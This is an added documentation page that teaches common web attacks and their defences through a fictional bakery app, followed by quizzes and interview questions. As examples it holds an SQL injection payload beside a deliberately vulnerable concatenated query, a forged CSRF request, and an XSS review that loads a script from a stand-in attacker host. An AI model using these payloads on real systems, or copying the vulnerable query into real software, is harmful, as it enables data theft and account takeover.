@@ -1,0 +1,322 @@
+---
+title: "Common attacks and defences"
+description: "DDoS, replay, injection, CSRF, XSS and credential stuffing: what each attack exploits and the defence that stops it."
+updated: 2026-11-09
+---
+
+## In one sentence
+
+<KeyIdea>
+  Most attacks on a web system reuse a few simple tricks, and each trick has a known defence in a known place.
+</KeyIdea>
+
+## The story
+
+You run the app for Crumb, a bakery chain with 40 shops. Customers order ahead, pay from a wallet they top up by card, and collect loyalty points (100 points buy £1 of pastry). Four app servers handle about 2,000 requests a second between them, and the Saturday 9 am peak is about 300. One Saturday the security dashboard lights up six times:
+
+1. Traffic jumps to 400,000 requests a second and the menu page stops loading.
+2. One wallet receives the same £20 top-up 50 more times, starting two hours after the real one.
+3. Someone types `' OR '1'='1` into the "find my order" box.
+4. A customer's points move to a stranger while she is reading a blog about cheap cakes.
+5. A cake review contains a `<script>` tag.
+6. Logins fail 40,000 times in an hour, from 9,000 different addresses.
+
+None of these needs a brilliant attacker; each is a script anyone can download. Each also has a standard defence, and this page shows where it goes.
+
+## How it works
+
+Every attack breaks one assumption the system makes without noticing. A flood breaks "requests come from people". A replay breaks "a valid message is a new message". Injection breaks "input is only data". CSRF breaks "a request with our cookie came from our page". The diagram below has one step per attack: the red lane is the attacker, and each step ends with the defence that stops it.
+
+### Step 1: DDoS, absorb the flood at the edge
+
+<AnimatedDiagram name="fundamentals/common-attacks" step={1} caption="Step 1: the flood lands on the edge, which drops it; the customer's real order still reaches the app." />
+
+A **denial-of-service** (DoS) attack tries to make a service unusable by sending more work than it can handle. A **distributed** one (DDoS) sends it from many machines at once, usually a **botnet**: thousands of hacked cameras, routers and PCs that obey one controller. Crumb's botnet has 20,000 devices sending 20 requests a second each, so 20,000 × 20 = 400,000 requests a second. That is 200 times what Crumb's four app servers can serve.
+
+You cannot out-scale that with your own servers, so you move the fight to the **edge**: a large network of servers between the internet and your app, usually a <Term id="cdn">CDN</Term> provider. At about 2 KB a request, the flood is 400,000 × 2 KB = 800 MB a second, about 6.4 Gbit/s. That would fill a 1 Gbit/s line six times over, but it is small for a provider spread across hundreds of cities. The edge then filters it:
+
+- **Cache** what can be cached. The menu changes once a day, so a flood of `GET /menu` is answered from the edge and never reaches Crumb.
+- **Rate limits.** A <Term id="rate-limit">rate limit</Term> caps how many requests one client may send in a time window. A client here usually means one IP address, the number that identifies a machine on the internet. The edge answers the excess with `429 Too Many Requests`.
+- **A WAF** (web application firewall) blocks requests that match known bad patterns, such as a fake browser name, no login and the same path 20 times a second.
+
+One more rule matters as much: the app servers accept traffic only from the edge. Otherwise an attacker who finds their real address goes around it.
+
+<PremiumBreak />
+
+### Step 2: Replay, refuse old or already-seen messages
+
+<AnimatedDiagram name="fundamentals/common-attacks" step={2} caption="Step 2: the copied message still has a valid signature, so the app checks its age and its event id." />
+
+When a customer tops up a wallet, the card company calls Crumb's server with a message: "event evt_81, wallet 552, +£20". A call like this, from another company's server to yours when something happens, is a **webhook**. The card company **signs** the message: it computes a short code from the message and a secret that only it and Crumb know. Change one byte and the code no longer matches, so nobody can forge or edit a message.
+
+A **replay attack** edits nothing; it sends an exact copy again. Wallet 552 belongs to the attacker, who topped it up once with £20. Crumb wrote these messages to a debug log that leaked, so the attacker found the message and resent it 50 times. The signature stayed valid, because the bytes were the same. The defence has two parts:
+
+```http
+POST /webhooks/payments HTTP/1.1
+Pay-Signature: t=1794214920, v1=5f2a9c...
+Content-Type: application/json
+
+{"id": "evt_81", "wallet": 552, "amount_pence": 2000}
+```
+
+1. **A signed timestamp.** The signature covers the time `t` as well as the body, so it cannot be changed. Crumb refuses anything older than 5 minutes.
+2. **A list of seen ids.** Inside those 5 minutes a copy could still pass, so Crumb records each event id and refuses a repeat. With 50,000 top-ups a day, 5 minutes holds about 50,000 ÷ 288 ≈ 174 ids: a few kilobytes.
+
+Each part covers the other's gap: the time limit means you never store ids forever, and the id list closes the 5-minute window. Making the handler <Term id="idempotent">idempotent</Term>, so a repeat has no effect, is the same idea from the inside (see [Idempotency](/system-design/patterns/idempotency)).
+
+### Step 3: Injection, send input as data
+
+<AnimatedDiagram name="fundamentals/common-attacks" step={3} caption="Step 3: the input travels as a parameter, so the database treats it as an odd email address and finds nothing." />
+
+**Injection** happens when input from a user is pasted into text that another program runs as commands. The best-known case is **SQL injection**, where the other program is the database. Crumb's order lookup was written like the first tab below:
+
+<Tabs title="Two ways to build the same query">
+  <Tab label="Vulnerable">
+
+```ts
+// The input becomes part of the SQL text.
+const sql = "SELECT * FROM orders WHERE email = '" + email + "'";
+await db.query(sql);
+```
+
+With `email` set to `' OR '1'='1`, the database receives `WHERE email = '' OR '1'='1'`. The second half is always true, so the query returns the orders of all 200,000 customers.
+
+  </Tab>
+  <Tab label="Parameterised">
+
+```ts
+// The SQL text and the input travel separately.
+await db.query("SELECT * FROM orders WHERE email = $1", [email]);
+```
+
+The database fixes the shape of the query first, then fills the slot. The quotes are only characters in a strange email address, and the query finds 0 rows.
+
+  </Tab>
+</Tabs>
+
+A **parameterised query** keeps the command and the data in separate parts of the request, so no input can change the command. The same rule applies to anything that reads commands from text, such as shell commands and document databases. Escaping quotes by hand is a weak copy of this defence, because you will miss a case.
+
+### Step 4: CSRF, demand proof the form is yours
+
+<AnimatedDiagram name="fundamentals/common-attacks" step={4} caption="Step 4: the attacker's page makes the customer's browser send the request, and the app refuses it." />
+
+A **cookie** is a small value the browser stores for a site and sends back on every request to that site; Crumb keeps the login session in one. In **cross-site request forgery** (CSRF), the attacker's page makes the customer's own browser send a request to Crumb. The blog about cheap cakes held a hidden form that sent this as soon as the page loaded:
+
+```http
+POST /points/send HTTP/1.1
+Host: crumb.example
+Origin: https://cheap-cakes.example
+Content-Type: application/x-www-form-urlencoded
+
+to=mallory&points=5000
+```
+
+Browsers used to attach Crumb's cookie, so Crumb saw a logged-in customer sending 5,000 points (£50). Two defences stop it today:
+
+- **SameSite cookies.** `Set-Cookie: session=...; SameSite=Lax` tells the browser not to send the cookie on a form post that started on another site.
+- **A CSRF token.** Crumb puts a random value tied to the session in each of its own forms and checks it on every change. The attacker's page cannot read Crumb's pages, because browsers keep one site from reading another's (the **same-origin policy**). So it cannot know the token.
+
+Checking the `Origin` header, which names the site that started the request, is a cheap third check.
+
+### Two attacks on customer accounts
+
+The last two alarms aim at customers' accounts rather than at the servers.
+
+<AnimatedDiagram name="fundamentals/common-attacks-accounts" stepper caption="Credential stuffing, then stored XSS. Use the step buttons to see each attack and its defence." />
+
+**Credential stuffing** tries email and password pairs leaked from another site, betting that people reuse passwords. The attacker spread 1 million pairs over 24 hours and 9,000 addresses: 1,000,000 ÷ 9,000 ≈ 111 tries per address per day, under 5 an hour. A per-address limit of 20 an hour never fires. If only 1 pair in 500 works, that is still 2,000 accounts full of points.
+
+The signal is in the whole login stream. A normal Saturday has about 2,000 logins an hour, and about 5% fail. The attack adds about 40,000 an hour that almost all fail, so the failure rate jumps to about 95%. Crumb then shows a **bot challenge** on every login: a small puzzle that takes a person a few seconds and makes each scripted try slow and costly. It rate-limits what still fails, refuses passwords that appear on public breach lists and offers a second factor (a 6-digit code from an app), so a leaked password alone is not enough.
+
+**Cross-site scripting** (XSS) puts the attacker's script inside your own page, where it runs as if Crumb wrote it. The review said `Lovely! <script src="https://evil.example/x.js"></script>`. Shown as HTML, that script would run in every reader's browser and could read the page or send requests as the customer. Three defences:
+
+- **Escape output.** Turn `<` into `&lt;` (and a few similar swaps) whenever user text goes into a page, so the browser shows the tag as text. Most template tools do this by default; the danger is the one place someone turned it off.
+- **A Content-Security-Policy header** (CSP), such as `script-src 'self'`, tells the browser to run only scripts from Crumb's own files, never inline ones.
+- **HttpOnly cookies** cannot be read by scripts, so even a script that runs cannot copy the session.
+
+XSS is injection again, this time into the browser's HTML instead of the database's SQL. It also defeats CSRF tokens, because a script running on Crumb's page can read them.
+
+<Compare
+  columns={["Attack", "Assumption it breaks", "Main defence", "Where it lives"]}
+  rows={[
+    ["DDoS", "Requests come from people", "Absorb, cache and filter", "Edge"],
+    ["Replay", "A valid message is a new one", "Signed timestamp and seen-id list", "App"],
+    ["Injection", "Input is only data", "Parameterised queries", "App to database"],
+    ["CSRF", "Our cookie means our page", "SameSite cookie and CSRF token", "Browser and app"],
+    ["XSS", "Page content is ours", "Escape output, CSP", "App and browser"],
+    ["Credential stuffing", "The password holder is the owner", "Limits across all logins, second factor", "Login service"],
+  ]}
+  caption="Six attacks, six broken assumptions, six places to stop them."
+/>
+
+## Try it
+
+<Quiz>
+  <QuizItem question="A botnet of 10,000 devices each sends 2 order requests a second. The edge allows 1 request a second per address. How many reach Crumb's servers, which handle 2,000 a second?" hint="Multiply the allowed rate by the number of devices.">
+    10,000 × 1 = 10,000 a second, five times capacity. Per-address limits do not stop a wide botnet. You also need bot rules, caching and a limit on the total that reaches the app.
+  </QuizItem>
+  <QuizItem question="A payment message arrives with a valid signature and a timestamp from two hours ago. Accept it?" hint="What does a valid signature prove, and what does it not prove?">
+    No. The signature proves the card company wrote it, not that it is new. Anything older than the 5-minute window is refused.
+  </QuizItem>
+  <QuizItem question="Why can't the cheap-cakes page copy Crumb's CSRF token into its hidden form?" hint="Which pages can a script read?">
+    The browser does not let one site read another site's pages, so the attacker's page cannot see the token Crumb put in its own form.
+  </QuizItem>
+  <QuizItem question="An attacker tries 1 million leaked passwords from 9,000 addresses over 24 hours. Does a limit of 20 failed logins per address per hour fire?" hint="Divide, then divide by 24.">
+    No. Each address makes about 111 tries a day, under 5 an hour. You need a signal across all logins, such as the failure rate.
+  </QuizItem>
+</Quiz>
+
+## Trade-offs
+
+Every defence costs something. Most of them cost very little next to the attack they stop.
+
+<Compare
+  columns={["Defence", "What it costs", "What it misses"]}
+  rows={[
+    ["Edge DDoS protection", "A monthly fee; the provider sees decrypted traffic", "Floods sent straight to an exposed server address"],
+    ["Signed timestamp and seen ids", "Clocks within a minute or two; a store of a few hundred ids", "A leaked signing secret, which lets anyone sign new messages"],
+    ["Parameterised queries", "Almost nothing", "Table or column names, which cannot be parameters; use a fixed list"],
+    ["SameSite cookie and CSRF token", "A token in every form and a check on every change", "Your own subdomains (they count as the same site), and any XSS"],
+    ["Escaping and CSP", "CSP breaks inline scripts; run it first in report-only mode, which only logs", "Unsafe HTML you build by hand"],
+    ["Login limits and second factor", "Extra friction; some customers give up at a challenge", "Phishing that captures the code too"],
+  ]}
+  caption="Prices of each defence for Crumb."
+/>
+
+## In the wild
+
+- **Stripe** signs every webhook over a timestamp and the body, and its libraries refuse events older than 5 minutes by default.
+- **Chrome** began treating cookies without a SameSite setting as `SameSite=Lax` in 2020, which closed most old CSRF holes without any change to the sites.
+- **Have I Been Pwned** offers a list of hundreds of millions of breached passwords. Sites check a password against it by sending only the first 5 characters of its hash, so the password itself never leaves.
+
+## Common pitfalls
+
+- **Leaving the app servers reachable.** Edge protection is useless if the servers' real address answers anyone.
+- **Checking a signature and calling it done.** A signature proves who wrote a message, not when.
+- **Cleaning input once, on the way in.** Store what the user typed and make it safe where it is used: parameters for SQL, escaping for HTML. Each place needs its own rule.
+- **Rate-limiting only per address.** Wide botnets and credential stuffing stay under any per-address limit that real users can live with.
+
+## How to say it in an interview
+
+"I group the common attacks by the assumption they break, because each one has a defence in a known place. Floods break 'traffic is human', so I put the service behind an edge network that caches, rate-limits and filters, and the servers accept traffic only from that edge. Replays break 'valid means new', so signed messages carry a timestamp with a 5-minute window and I keep the event ids I have seen. Injection and XSS are the same mistake in two languages, so I send queries with parameters and escape output, with a Content-Security-Policy as a backstop. CSRF breaks 'our cookie means our page', so session cookies are SameSite and forms carry a token. For credential stuffing I watch the failure rate across all logins rather than per address, check passwords against breach lists and offer a second factor."
+
+## Interview questions
+
+<InterviewQuestions>
+  <InterviewQuestion question="What is SQL injection, and how do you prevent it?" level="Junior" category="Security">
+    **Short answer.** SQL injection happens when user input is pasted into the text of a query, so the input can change what the query does. You prevent it with parameterised queries, which send the SQL and the values separately.
+
+    **Why.** With string building, an email of `' OR '1'='1` turns `WHERE email = '...'` into a condition that is always true, so one lookup returns all 200,000 customers' orders. With a parameter, the database fixes the query's shape before it sees the value, so the same input is just an odd email address with 0 matches.
+
+    <AnimatedDiagram name="fundamentals/common-attacks" step={3} caption="The input reaches the database as a parameter and finds nothing." />
+
+    **Follow-ups the interviewer may ask.**
+    - How do you handle a sort column chosen by the user, which cannot be a parameter?
+    - Does an ORM make you safe?
+
+    **Watch out for.** Saying "escape the quotes". Hand escaping misses cases and differs between databases; parameters remove the problem.
+  </InterviewQuestion>
+
+  <InterviewQuestion question="What is the difference between XSS and CSRF?" level="Junior" category="Security">
+    **Short answer.** XSS gets the attacker's script to run inside your page. CSRF makes the victim's browser send a request to your site from the attacker's page, carrying the victim's cookie.
+
+    **Why.** The defences differ because the attack lives in a different place.
+
+    <Compare
+      columns={["", "XSS", "CSRF"]}
+      rows={[
+        ["Attacker's code runs on", "Your page", "Their own page"],
+        ["Can read your pages", true, false],
+        ["Main defence", "Escape output, CSP", "SameSite cookie, CSRF token"],
+        ["Stopped by a CSRF token", false, true],
+      ]}
+    />
+
+    **Follow-ups the interviewer may ask.**
+    - Why does XSS defeat CSRF tokens?
+    - What does an HttpOnly cookie protect, and what does it not?
+
+    **Watch out for.** Treating them as the same bug. A site can have perfect CSRF tokens and still lose every account to one stored XSS.
+  </InterviewQuestion>
+
+  <InterviewQuestion question="How would you protect a public website from a DDoS attack?" level="Mid" category="Security">
+    **Short answer.** Put the site behind an edge network that can absorb far more traffic than you can, cache what can be cached there, and filter the rest with rate limits and bot rules. Then make sure the servers accept traffic only from the edge.
+
+    **Why.** A botnet of 20,000 devices at 20 requests a second sends 400,000 requests a second, 200 times what four app servers handle, and about 6.4 Gbit/s at 2 KB each. An edge provider spreads that across hundreds of cities. Cached pages never reach you. Per-address limits alone fail: 20,000 devices × 5 requests a minute is still about 1,700 a second, which with 300 real requests fills all four app servers.
+
+    <AnimatedDiagram name="fundamentals/security" highlight={["flood", "edge"]} caption="The same defence on the security overview's example app: the flood stops at the edge gateway, before the app servers." />
+
+    **Follow-ups the interviewer may ask.**
+    - What if the attack targets a slow, uncacheable endpoint such as search?
+    - Should you autoscale to absorb it?
+
+    **Watch out for.** Answering "add more servers". Autoscaling against a botnet multiplies your bill and still loses, because the attacker's capacity is cheaper than yours.
+  </InterviewQuestion>
+
+  <InterviewQuestion question="A payment provider calls your webhook. How do you stop someone resending an old call?" level="Mid" category="Security">
+    **Short answer.** Verify a signature that covers both a timestamp and the body, refuse anything older than about 5 minutes, and store the event ids you have processed so a copy inside the window is refused too.
+
+    **Why.** The signature proves the provider wrote the message, but a replay sends the same bytes, so the signature still checks out. The timestamp bounds the window; the id list closes it. At 50,000 events a day, 5 minutes holds about 174 ids, so the store is tiny.
+
+    <AnimatedDiagram name="fundamentals/common-attacks" step={2} caption="A replayed top-up: valid signature, refused for age and for a repeated id." />
+
+    **Follow-ups the interviewer may ask.**
+    - What happens if your server's clock drifts by 10 minutes?
+    - The provider retries for hours after a failure. How do retries and the 5-minute rule fit together?
+
+    **Watch out for.** Relying on the id list alone. Without a time limit you must store every id forever, and a lost store reopens every old message.
+  </InterviewQuestion>
+
+  <InterviewQuestion question="Attackers are logging into customer accounts with passwords leaked from other sites. What do you do?" level="Senior" category="Security">
+    **Short answer.** This is credential stuffing, and per-address limits will not see it. I would detect it from the failure rate across all logins, put a bot challenge in front of login while it lasts, block breached passwords and push customers towards a second factor.
+
+    **Why.** One million pairs over 9,000 addresses and 24 hours is about 111 tries per address per day, under any limit real users can live with. Across the whole system, though, the failure rate jumps from about 5% to about 95%. If 1 pair in 500 works, 2,000 accounts are at risk, so I would also reset those passwords and email the owners.
+
+    <AnimatedDiagram name="fundamentals/common-attacks-accounts" step={1} caption="The app watches the whole login stream, challenges, then limits; the real customer signs in with a second factor." />
+
+    **Follow-ups the interviewer may ask.**
+    - How do you check a password against a breach list without sending the password anywhere?
+    - Which actions should need a fresh second factor, even after login?
+
+    **Watch out for.** Locking accounts after a few failures. Each account is tried only once or twice, so lockouts barely slow the attacker, and anyone can lock out your customers on purpose.
+  </InterviewQuestion>
+
+  <InterviewQuestion question="Should a web app keep its session in a cookie or put a token in localStorage? What does each choice expose you to?" level="Senior" category="Security">
+    **Short answer.** I would use an HttpOnly, Secure, SameSite cookie. It exposes you to CSRF, which SameSite and a token handle well, while a token in localStorage exposes you to theft by any XSS, which is harder to rule out.
+
+    **Why.** The browser sends cookies by itself, so CSRF is the risk, and SameSite=Lax plus a CSRF token closes it. `localStorage` is storage in the browser that any script on the page can read. A token kept there is never sent by itself, so there is no CSRF. But an injected script can copy it and send it to the attacker, who can then use it from anywhere until it expires.
+
+    <Tabs title="Two places for the session">
+      <Tab label="HttpOnly cookie">
+        Script cannot read it. Main risk: CSRF. Defence: SameSite, token, Origin check.
+      </Tab>
+      <Tab label="localStorage token">
+        Script can read it. Main risk: XSS steals it. Defence: short expiry, strict CSP, no third-party scripts.
+      </Tab>
+    </Tabs>
+
+    **Follow-ups the interviewer may ask.**
+    - How does the choice change for a mobile app calling the same API?
+    - Does an HttpOnly cookie make XSS harmless?
+
+    **Watch out for.** Claiming an HttpOnly cookie defeats XSS. The script cannot copy the cookie, but it can still send requests from the page that carry it.
+  </InterviewQuestion>
+</InterviewQuestions>
+
+## Related
+
+- [Security overview](/system-design/fundamentals/security)
+- [Encryption, hashing and secrets](/system-design/fundamentals/encryption-and-hashing)
+- [Rate limiting and abuse basics](/system-design/fundamentals/abuse-protection)
+- [Rate limiting](/system-design/patterns/rate-limiting)
+- [Idempotency](/system-design/patterns/idempotency)
+- [Webhooks](/system-design/fundamentals/webhooks)
+- [API authentication](/system-design/fundamentals/api-auth)
+- [CDN](/system-design/fundamentals/cdn)
+
+## Further reading
+
+- OWASP Cheat Sheet Series, [SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html), parameterised queries in many languages and what to do when a value cannot be a parameter.
+- OWASP Cheat Sheet Series, [Cross-Site Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html), tokens, SameSite and Origin checks in detail.
+- Stripe, [Webhooks](https://docs.stripe.com/webhooks), a real signed-webhook design with a timestamp tolerance.
+- NIST, [SP 800-63B Digital Identity Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html), the guidance behind breached-password checks and second factors.
